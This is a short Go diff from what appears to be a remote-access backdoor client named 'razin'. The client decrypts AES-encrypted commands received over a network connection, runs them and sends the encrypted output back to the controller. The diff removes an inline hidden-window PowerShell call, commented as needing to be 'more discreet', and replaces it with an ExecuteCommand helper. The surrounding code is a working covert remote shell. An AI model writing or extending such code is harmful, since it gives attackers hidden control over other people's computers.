@@ -4,8 +4,6 @@ import (
 	"bufio"
 	"fmt"
 	"net"
-	"os/exec"
-	"syscall"
 
 	"github.com/bogdzn/razin/server/aes"
 	"github.com/spf13/cobra"
@@ -69,14 +67,7 @@ func LoadClientCLI() *cobra.Command {
 					fmt.Printf(" ---=== [ new packet ] ===---\nReceived: %s\nTranslated: %s\n\n", msg, decrypted)
 				}
 
-				/* TODO: improve the call to powershell to something more discreet lol */
-				cmd := exec.Command("powershell", decrypted)
-				cmd.SysProcAttr = &syscall.SysProcAttr{
-					HideWindow: true,
-				}
-
-				/* retrieve output or error & send it back! */
-				out, err := cmd.CombinedOutput()
+				out, err := ExecuteCommand(decrypted)
 				if err != nil {
 					fmt.Fprint(conn, aes.EncryptAes("command failure:\n", opts.AesKey))
 					fmt.Fprint(conn, aes.EncryptAes(err.Error(), opts.AesKey))
